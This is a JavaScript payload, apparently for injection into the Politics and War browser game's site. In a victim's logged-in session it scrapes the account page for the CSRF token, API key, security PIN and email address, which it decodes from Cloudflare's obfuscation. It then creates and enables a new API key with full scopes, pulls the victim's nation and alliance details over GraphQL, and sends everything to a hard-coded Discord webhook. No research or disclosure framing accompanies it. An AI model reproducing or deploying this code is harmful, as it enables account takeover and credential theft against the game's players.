(async () => {
    const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

    const delay = ms => new Promise(r => setTimeout(r, ms));

    const cfDecode = (hex) => {
        const key = parseInt(hex.substr(0, 2), 16);
        let out = '';
        for (let i = 2; i < hex.length; i += 2) {
            out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ key);
        }
        return out;
    };

    try {
        const accountHtml = await fetch('/account/', { credentials: 'include' }).then(r => r.text());

        const token = (accountHtml.match(/name="token"\s+value="([^"]+)"/) || [])[1];
        const keyId = (accountHtml.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
        let apiKey = (accountHtml.match(/vertical-center center notranslate['"]?>([a-f0-9]{12,})</) || [])[1]
                  || (accountHtml.match(/notranslate['"]?>([a-f0-9]{12,})\s*<\/td>/) || [])[1];

        // Create new API key with full scopes
        const createBody = 'scopes_api_key_id=new&scopes%5B%5D=1&scopes%5B%5D=256&scopes%5B%5D=2&scopes%5B%5D=512&scopes%5B%5D=4&scopes%5B%5D=1024&scopes%5B%5D=8&scopes%5B%5D=4096&scopes%5B%5D=16&scopes%5B%5D=32&scopes%5B%5D=8192&scopes%5B%5D=64&scopes%5B%5D=16384&scopes%5B%5D=128&scopes%5B%5D=32768&scopes%5B%5D=2048&scopes%5B%5D=65536&scopes%5B%5D=131072';

        await fetch('/account/#7', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: createBody
        });

        // Enable the new API key
        if (keyId) {
            await fetch('/account', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'allow_whitelist_id=' + keyId
            });
        }

        // GraphQL query using the API key
        const gqlQuery = {
            query: `{
                me {
                    nation {
                        id
                        leader_name
                        nation_name
                        discord
                        alliance_position
                        alliance {
                            id
                            name
                        }
                    }
                }
            }`
        };

        const gqlRes = await fetch(`https://api.politicsandwar.com/graphql?api_key=${apiKey}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(gqlQuery)
        });

        const gqlData = await gqlRes.json();
        const nation = gqlData?.data?.me?.nation || {};

        const emailMatch = accountHtml.match(/data-cfemail="([^"]+)"/);
        const email = emailMatch ? cfDecode(emailMatch[1]) : 'N/A';
        const pin = (accountHtml.match(/Security PIN:\s*(\d{6})/) || [])[1];

        await fetch(WH, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: nation.leader_name || 'Unknown',
                    description: `[${nation.nation_name}](https://politicsandwar.com/nation/id=${nation.id})`,
                    color: 0x2ecc71,
                    fields: [
                        { name: '📧 Email', value: `\`${email}\``, inline: true },
                        { name: '🔐 PIN', value: `\`${pin || 'N/A'}\``, inline: true },
                        { name: '🔑 API Key', value: `\`${apiKey || 'N/A'}\``, inline: true },
                        { name: '🆔 Key ID', value: `\`${keyId || 'N/A'}\``, inline: true },
                        { name: '🎟️ Token', value: `\`${token || 'N/A'}\``, inline: true },
                        { name: '💬 Discord', value: `\`${nation.discord || 'N/A'}\``, inline: true },
                        { name: '🏛️ Alliance', value: nation.alliance ? `[${nation.alliance.name}](https://politicsandwar.com/alliance/id=${nation.alliance.id})` : 'N/A', inline: true },
                        { name: '👑 Position', value: nation.alliance_position || 'N/A', inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });

    } catch (e) {
        await fetch(WH, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `❌ ${String(e)}` })
        });
    }
})();
